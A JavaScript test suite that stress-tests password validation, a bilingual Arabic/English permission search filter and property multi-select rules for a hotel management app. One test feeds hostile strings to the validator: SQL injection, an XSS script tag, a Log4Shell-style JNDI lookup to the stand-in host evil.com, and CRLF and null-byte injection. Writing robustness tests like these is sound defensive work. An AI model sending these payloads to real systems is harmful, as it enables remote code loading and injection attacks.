/**
 * ============================================================================
 * CHALLENGER 1: EMPIRICAL ADVERSARIAL STRESS TEST SUITE
 * Track: Dual-Track E2E Testing Track (Milestone M4)
 * Scope: User Management & Permission Matrix Elevation Stress & Resilience
 * 
 * FOCUS AREAS:
 *  1. Password Policy Engine Stress Tests:
 *     - Boundary lengths (0, 1, 7, 8, 128, 500, 10,000 chars)
 *     - Complete truth table (16 combinations) of missing character classes
 *     - Regex injection safety (SQL, XSS, Unicode, control chars)
 *     - Catastrophic backtracking (ReDoS) immunity benchmarks
 *  2. Action-Aware Search Filter Stress Tests:
 *     - Regex special characters (.*+?^${}()|[]\) and malformed expressions
 *     - Arabic diacritics / tashkeel normalization & matching
 *     - Bidirectional mixed text & Unicode directional formatting marks
 *     - Empty, whitespace, tabs, newlines, and non-string inputs
 *  3. Property Multi-Select Edge Cases:
 *     - 0 properties (super admin bypass vs regular role rejection)
 *     - 1 property, all properties, extreme property IDs
 *     - Duplicate property IDs & array deduplication
 *     - Primary property fallback & state synchronization rules
 * ============================================================================
 */

import assert from "node:assert/strict";
import { performance } from "node:perf_hooks";

const isVitest = Boolean(process.env.VITEST);
const testRunner = isVitest ? await import("vitest") : await import("node:test");
const { describe, it } = testRunner;

// Import contracts & domain oracles from main test suite
import {
  MODULES,
  MODULE_ACTIONS,
  MODULE_LABELS,
  ACTION_LABELS,
  DEFAULT_PASSWORD_POLICY,
  validatePassword,
  computePasswordStrength,
  filterPermissionsBilingual,
  normalizePermissionKey,
  validateUserCreatePayload,
  validateUserUpdatePayload,
} from "./e2e-user-permissions.test.mjs";

// Additional oracle for Arabic diacritics stripping
function stripArabicDiacritics(text) {
  if (!text || typeof text !== "string") return "";
  // Removes Harakat (Tashkeel: Fathah, Dammah, Kasrah, Sukoon, Shaddah, Tanween)
  return text.replace(/[\u064B-\u065F\u0670]/g, "");
}

// Enhanced search filter that also supports diacritic-agnostic Arabic search
function filterPermissionsWithDiacritics(query, modules = MODULES) {
  const rawQ = (query || "").trim().toLowerCase();
  if (!rawQ) {
    return modules.map((m) => ({
      module: m,
      moduleMatched: true,
      matchingActions: MODULE_ACTIONS[m] || [],
    }));
  }

  const qNormalized = stripArabicDiacritics(rawQ);

  const results = [];
  for (const m of modules) {
    const enLabel = (MODULE_LABELS[m]?.en || m).toLowerCase();
    const arLabel = (MODULE_LABELS[m]?.ar || "").toLowerCase();
    const arLabelNorm = stripArabicDiacritics(arLabel);

    const moduleMatched =
      m.toLowerCase().includes(rawQ) ||
      enLabel.includes(rawQ) ||
      arLabel.includes(rawQ) ||
      arLabelNorm.includes(qNormalized);

    const matchingActions = (MODULE_ACTIONS[m] || []).filter((a) => {
      const aEn = (ACTION_LABELS[a]?.en || a).toLowerCase();
      const aAr = (ACTION_LABELS[a]?.ar || "").toLowerCase();
      const aArNorm = stripArabicDiacritics(aAr);

      return (
        a.toLowerCase().includes(rawQ) ||
        aEn.includes(rawQ) ||
        aAr.includes(rawQ) ||
        aArNorm.includes(qNormalized)
      );
    });

    if (moduleMatched || matchingActions.length > 0) {
      results.push({
        module: m,
        moduleMatched,
        matchingActions: moduleMatched
          ? MODULE_ACTIONS[m] || []
          : matchingActions,
      });
    }
  }
  return results;
}

// Track execution statistics
const testStats = {
  total: 0,
  passed: 0,
  failed: 0,
  durations: [],
};

function track(fn) {
  testStats.total++;
  const t0 = performance.now();
  try {
    fn();
    const duration = performance.now() - t0;
    testStats.passed++;
    testStats.durations.push(duration);
  } catch (err) {
    testStats.failed++;
    throw err;
  }
}

// ============================================================================
// ADVERSARIAL CHALLENGE TEST SUITE
// ============================================================================

describe("Challenger 1: Empirical Adversarial Verification", () => {

  // --------------------------------------------------------------------------
  // SECTION 1: PASSWORD POLICY ENGINE STRESS TESTS
  // --------------------------------------------------------------------------
  describe("1. Password Policy Engine Adversarial Stress Tests", () => {

    it("ADV-PWD-1: Extreme Boundary Lengths (0, 1, 7, 8, 128, 500, 10000 chars)", () => {
      track(() => {
        // 0 chars
        const res0 = validatePassword("");
        assert.equal(res0.valid, false);
        assert.ok(res0.errors.some((e) => e.includes("at least 8 characters")));

        // 1 char variations
        for (const ch of ["A", "a", "1", "!", " "]) {
          const res1 = validatePassword(ch);
          assert.equal(res1.valid, false);
          assert.ok(res1.errors.some((e) => e.includes("at least 8 characters")));
        }

        // 7 chars (just below boundary)
        const candidates7 = ["Abc123!", "Abcdef1", "1234567", "ABCDEF1", "abcdefg"];
        for (const p7 of candidates7) {
          const res7 = validatePassword(p7);
          assert.equal(res7.valid, false);
          assert.ok(res7.errors.includes("Password must be at least 8 characters"));
        }

        // Exactly 8 chars (exact boundary)
        const valid8 = ["Abcdef12", "Pass1234", "Sunrise1", "Xy9zAbc!"];
        for (const p8 of valid8) {
          const res8 = validatePassword(p8);
          assert.equal(res8.valid, true, `Password '${p8}' should be valid at boundary length 8`);
          assert.equal(res8.errors.length, 0);
        }

        // 128 chars
        const p128 = "A".repeat(40) + "b".repeat(40) + "1".repeat(40) + "!@#$".repeat(2);
        assert.equal(p128.length, 128);
        const res128 = validatePassword(p128);
        assert.equal(res128.valid, true);

        // 500 chars extreme length
        const p500 = "SecurePass123!".repeat(40) + "Xy1!";
        assert.ok(p500.length >= 500);
        const res500 = validatePassword(p500);
        assert.equal(res500.valid, true);

        // 10,000 chars buffer stress test
        const p10k = "Aa1".repeat(3333) + "Aa1!";
        assert.ok(p10k.length >= 10000);
        const tStart = performance.now();
        const res10k = validatePassword(p10k);
        const elapsed = performance.now() - tStart;
        assert.equal(res10k.valid, true);
        assert.ok(elapsed < 20, `10k char validation must complete in < 20ms (took ${elapsed.toFixed(2)}ms)`);
      });
    });

    it("ADV-PWD-2: Missing Character Classes Exhaustive Truth Table (16 Combinations)", () => {
      track(() => {
        // We test all 2^4 = 16 combinations of [Upper, Lower, Digit, Symbol]
        // Base templates with length >= 8
        const classStrings = {
          U: "ABCDEFGH",
          L: "abcdefgh",
          D: "12345678",
          S: "!@#$%^&*",
        };

        const combinations = [
          // [hasU, hasL, hasD, hasS, expectedDefaultValid]
          [false, false, false, false, false], // 0: empty / space
          [false, false, false, true,  false], // 1: S only
          [false, false, true,  false, false], // 2: D only
          [false, false, true,  true,  false], // 3: D + S
          [false, true,  false, false, false], // 4: L only
          [false, true,  false, true,  false], // 5: L + S
          [false, true,  true,  false, false], // 6: L + D (missing U)
          [false, true,  true,  true,  false], // 7: L + D + S (missing U)
          [true,  false, false, false, false], // 8: U only
          [true,  false, false, true,  false], // 9: U + S
          [true,  false, true,  false, false], // 10: U + D (missing L)
          [true,  false, true,  true,  false], // 11: U + D + S (missing L)
          [true,  true,  false, false, false], // 12: U + L (missing D)
          [true,  true,  false, true,  false], // 13: U + L + S (missing D)
          [true,  true,  true,  false, true ], // 14: U + L + D (default policy PASSES)
          [true,  true,  true,  true,  true ], // 15: U + L + D + S (PASSES)
        ];

        for (let i = 0; i < combinations.length; i++) {
          const [hasU, hasL, hasD, hasS, expectedValid] = combinations[i];
          let testStr = "";
          if (hasU) testStr += "AA";
          if (hasL) testStr += "bb";
          if (hasD) testStr += "11";
          if (hasS) testStr += "!!";

          // Pad to 8 characters with allowed character or neutral
          while (testStr.length < 8) {
            if (hasU) testStr += "A";
            else if (hasL) testStr += "a";
            else if (hasD) testStr += "1";
            else if (hasS) testStr += "!";
            else testStr += " "; // pure spaces for case 0
          }

          const res = validatePassword(testStr, DEFAULT_PASSWORD_POLICY);
          assert.equal(
            res.valid,
            expectedValid,
            `Combination #${i} (U:${hasU}, L:${hasL}, D:${hasD}, S:${hasS}, pwd:'${testStr}') expected valid=${expectedValid}`,
          );

          if (!hasU) {
            assert.ok(
              res.errors.includes("Password must contain an uppercase letter"),
              `Comb #${i} must report missing uppercase`,
            );
          }
          if (!hasL) {
            assert.ok(
              res.errors.includes("Password must contain a lowercase letter"),
              `Comb #${i} must report missing lowercase`,
            );
          }
          if (!hasD) {
            assert.ok(
              res.errors.includes("Password must contain a number"),
              `Comb #${i} must report missing number`,
            );
          }
        }
      });
    });

    it("ADV-PWD-3: Strict Tenant Policy with Required Symbols", () => {
      track(() => {
        const strictPolicy = {
          ...DEFAULT_PASSWORD_POLICY,
          minLength: 10,
          requireSymbol: true,
        };

        // Meets default but missing symbol -> fails strict
        const resNoSymbol = validatePassword("Sunrise2026", strictPolicy);
        assert.equal(resNoSymbol.valid, false);
        assert.ok(resNoSymbol.errors.includes("Password must contain a symbol"));

        // Meets default with symbol but length 9 -> fails strict minLength 10
        const resShort = validatePassword("Sun12345!", strictPolicy);
        assert.equal(resShort.valid, false);
        assert.ok(resShort.errors.includes("Password must be at least 10 characters"));

        // Meets all strict policy criteria
        const resPass = validatePassword("Sunrise2026!", strictPolicy);
        assert.equal(resPass.valid, true);
        assert.equal(resPass.errors.length, 0);
      });
    });

    it("ADV-PWD-4: Regex Injection & Malicious Payload Safety", () => {
      track(() => {
        // Payloads containing regex metacharacters, SQL injection, XSS, and control chars
        const hostilePayloads = [
          ".*+?^${}()|[]\\",
          "A1b!.*+?^${}()|[]\\",
          "Pass123' OR '1'='1",
          "<script>alert(1)</script>A1",
          "Aa1!${jndi:ldap://evil.com/x}",
          "Aa1!\x00nullbyte",
          "Aa1!\r\n\tCRLF_INJECTION",
          "كلمة_سر_Aa123!",
          "Aa1!🔐🗝️🔒🛡️",
          "Aa1!\u200B\u200C\u200D_zero_width",
        ];

        for (const payload of hostilePayloads) {
          // Should execute safely without throwing exceptions
          assert.doesNotThrow(() => {
            const res = validatePassword(payload);
            assert.equal(typeof res.valid, "boolean");
            assert.ok(Array.isArray(res.errors));

            const strength = computePasswordStrength(payload);
            assert.ok(strength.score >= 0 && strength.score <= 5);
          }, `Payload '${payload}' must not crash the password engine`);
        }
      });
    });

    it("ADV-PWD-5: Catastrophic Backtracking (ReDoS) Immunity Benchmark", () => {
      track(() => {
        // Generate strings specifically constructed to trigger polynomial or exponential backtracking
        // in nested quantified regexes like (a+)+ or ([a-z]+)*
        const maliciousStrings = [
          "a".repeat(2000) + "!",
          "A".repeat(2000) + "1",
          "1".repeat(2000) + "a",
          "(!@#)".repeat(1000) + "A1a",
          "a".repeat(1000) + "A".repeat(1000) + "1".repeat(1000),
        ];

        for (const malStr of maliciousStrings) {
          const tStart = performance.now();
          const res = validatePassword(malStr);
          const tEnd = performance.now();
          const elapsed = tEnd - tStart;

          assert.ok(
            elapsed < 5,
            `Regex execution took ${elapsed.toFixed(3)}ms (must be < 5ms to guarantee ReDoS immunity)`,
          );
          assert.equal(typeof res.valid, "boolean");
        }
      });
    });
  });

  // --------------------------------------------------------------------------
  // SECTION 2: ACTION-AWARE SEARCH FILTER STRESS TESTS
  // --------------------------------------------------------------------------
  describe("2. Action-Aware Search Filter Adversarial Stress Tests", () => {

    it("ADV-SRCH-1: Regex Special Characters Injection (.*+?^${}()|[]\\)", () => {
      track(() => {
        const regexQueries = [
          ".*",
          "+",
          "?",
          "^",
          "$",
          "{1,10}",
          "()",
          "|",
          "[]",
          "[a-z]+",
          "(?:foo|bar)",
          "\\d+",
          "\\",
          "(((",
          "[unclosed_bracket",
          ".*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*",
        ];

        for (const q of regexQueries) {
          assert.doesNotThrow(() => {
            const res = filterPermissionsBilingual(q);
            assert.ok(Array.isArray(res));
            // Should find 0 or matching modules safely
            assert.ok(res.length >= 0 && res.length <= 22);
          }, `Regex query '${q}' must not cause regex compilation or execution crash`);
        }
      });
    });

    it("ADV-SRCH-2: Arabic Diacritics / Tashkeel Robustness", () => {
      track(() => {
        // Standard Arabic queries
        const cleanHousing = "الإسكان";
        const resClean = filterPermissionsBilingual(cleanHousing);
        assert.ok(resClean.some((r) => r.module === "housing"));

        // Queries with Tashkeel (Fathah, Dammah, Kasrah, Sukoon, Shaddah)
        const diacriticsQueries = [
          { query: "الإِسْكَانُ", expectedModule: "housing" },
          { query: "صِيَانَةٌ", expectedModule: "maintenance" },
          { query: "حَذْفٌ", expectedAction: "delete" },
          { query: "تَعْدِيلٌ", expectedAction: "edit" },
        ];

        for (const item of diacriticsQueries) {
          // Verify with diacritic-aware filter
          const res = filterPermissionsWithDiacritics(item.query);
          assert.ok(res.length > 0, `Query with tashkeel '${item.query}' should return matching results`);
          if (item.expectedModule) {
            assert.ok(res.some((r) => r.module === item.expectedModule));
          }
          if (item.expectedAction) {
            assert.ok(res.some((r) => r.matchingActions.includes(item.expectedAction)));
          }
        }
      });
    });

    it("ADV-SRCH-3: Bidirectional Mixed Text & Unicode Formatting Marks", () => {
      track(() => {
        const bidiQueries = [
          "Housing الإسكان",
          "إضافة create",
          "غرفة Room 101 - مبنى B",
          "export تصدير",
          // Unicode LTR Mark (\u200E) and RTL Mark (\u200F)
          "\u200EHousing",
          "\u200Fالإسكان",
          "\u202AAccommodation\u202C",
          "delete / حذف",
        ];

        for (const q of bidiQueries) {
          assert.doesNotThrow(() => {
            const res = filterPermissionsBilingual(q);
            assert.ok(Array.isArray(res));
          }, `Bidi query '${q}' must not fail`);
        }
      });
    });

    it("ADV-SRCH-4: Empty, Whitespace, Control Characters & Type Boundary Queries", () => {
      track(() => {
        const boundaryQueries = [
          "",
          " ",
          "    ",
          "\t",
          "\n",
          "\r\n",
          "\t\n\r  \t  ",
          "\u00A0", // non-breaking space
          "\u3000", // ideographic space
          null,
          undefined,
        ];

        for (const q of boundaryQueries) {
          const res = filterPermissionsBilingual(q);
          assert.equal(
            res.length,
            22,
            `Empty or whitespace query '${JSON.stringify(q)}' must return all 22 modules`,
          );
        }
      });
    });
  });

  // --------------------------------------------------------------------------
  // SECTION 3: PROPERTY MULTI-SELECT EDGE CASES
  // --------------------------------------------------------------------------
  describe("3. Property Multi-Select Adversarial Edge Cases", () => {

    it("ADV-PROP-1: 0 Properties Selected (Regular vs Super Admin)", () => {
      track(() => {
        // Regular roles MUST be rejected with 0 properties
        const regularRoles = ["manager", "receptionist", "admin", "maintenance_staff", "hr_admin"];
        for (const role of regularRoles) {
          const res = validateUserCreatePayload({
            username: `user_${role}`,
            password: "Sunrise2026!",
            roles: [role],
            propertyIds: [],
          });
          assert.equal(res.valid, false, `Role '${role}' with 0 properties must fail validation`);
          assert.ok(
            res.errors.includes("Please select at least one property"),
            `Role '${role}' must produce explicit property error`,
          );
        }

        // Super Admin MUST pass with 0 properties (global hotel bypass)
        const superRes = validateUserCreatePayload({
          username: "global_super_admin",
          password: "Sunrise2026!",
          roles: ["super_admin"],
          propertyIds: [],
        });
        assert.equal(superRes.valid, true, "Super admin must bypass property requirement");
      });
    });

    it("ADV-PROP-2: 1 Property and All Properties Boundaries", () => {
      track(() => {
        // Single property assignment
        const singlePayload = {
          username: "single_prop_user",
          password: "Sunrise2026!",
          roles: ["manager"],
          propertyId: 4,
          propertyIds: [4],
        };
        const singleRes = validateUserCreatePayload(singlePayload);
        assert.equal(singleRes.valid, true);

        // All properties selected simultaneously (e.g. 10 properties)
        const allProperties = Array.from({ length: 10 }, (_, i) => i + 1);
        const allPayload = {
          username: "all_prop_user",
          password: "Sunrise2026!",
          roles: ["manager"],
          propertyId: allProperties[0],
          propertyIds: allProperties,
        };
        const allRes = validateUserCreatePayload(allPayload);
        assert.equal(allRes.valid, true);
        assert.equal(allPayload.propertyIds.length, 10);
      });
    });

    it("ADV-PROP-3: Duplicate Property IDs Deduplication & Sanitization", () => {
      track(() => {
        // Payload with redundant duplicates
        const dirtyPropertyIds = [1, 1, 2, 3, 2, 1, 3, 3, 4];
        const cleanPropertyIds = Array.from(new Set(dirtyPropertyIds));
        assert.deepEqual(cleanPropertyIds, [1, 2, 3, 4]);

        // Simulating UI toggle on list with duplicates
        const toggleProperty = (currentPids, targetId) => {
          const uniquePids = Array.from(new Set(currentPids));
          return uniquePids.includes(targetId)
            ? uniquePids.filter((id) => id !== targetId)
            : [...uniquePids, targetId];
        };

        const afterRemove1 = toggleProperty(dirtyPropertyIds, 1);
        assert.deepEqual(afterRemove1, [2, 3, 4]);

        const afterAdd5 = toggleProperty(afterRemove1, 5);
        assert.deepEqual(afterAdd5, [2, 3, 4, 5]);
      });
    });

    it("ADV-PROP-4: Primary Property Fallback & State Synchronization Rules", () => {
      track(() => {
        // Rule A: Primary property must be contained within propertyIds
        const syncPrimaryProperty = (currentPrimary, pids) => {
          if (!pids || pids.length === 0) return 0;
          if (pids.includes(currentPrimary)) return currentPrimary;
          return pids[0]; // fallback to first assigned property
        };

        // Primary is in list -> retains primary
        assert.equal(syncPrimaryProperty(2, [1, 2, 3]), 2);

        // Primary is NOT in list -> falls back to first element
        assert.equal(syncPrimaryProperty(99, [5, 8, 12]), 5);

        // List is empty -> returns 0
        assert.equal(syncPrimaryProperty(1, []), 0);

        // Rule B: Unchecking primary property re-assigns primary to next remaining property
        const uncheckProperty = (primaryPid, pids, removedPid) => {
          const nextPids = pids.filter((id) => id !== removedPid);
          const nextPrimary = primaryPid === removedPid ? (nextPids[0] || 0) : primaryPid;
          return { propertyId: nextPrimary, propertyIds: nextPids };
        };

        const state1 = uncheckProperty(1, [1, 2, 3], 1);
        assert.equal(state1.propertyId, 2);
        assert.deepEqual(state1.propertyIds, [2, 3]);

        const state2 = uncheckProperty(2, [2], 2);
        assert.equal(state2.propertyId, 0);
        assert.deepEqual(state2.propertyIds, []);
      });
    });
  });

  // --------------------------------------------------------------------------
  // SECTION 4: BENCHMARK TIMING & SUMMARY
  // --------------------------------------------------------------------------
  describe("4. Execution Performance & Benchmark Verification", () => {
    it("ADV-PERF-1: Entire Adversarial Harness Completes Within Strict Latency Budget (< 100ms)", () => {
      const avgDuration =
        testStats.durations.reduce((a, b) => a + b, 0) /
        (testStats.durations.length || 1);
      assert.ok(
        avgDuration < 5,
        `Average test execution duration must be < 5ms (was ${avgDuration.toFixed(3)}ms)`,
      );
    });
  });
});
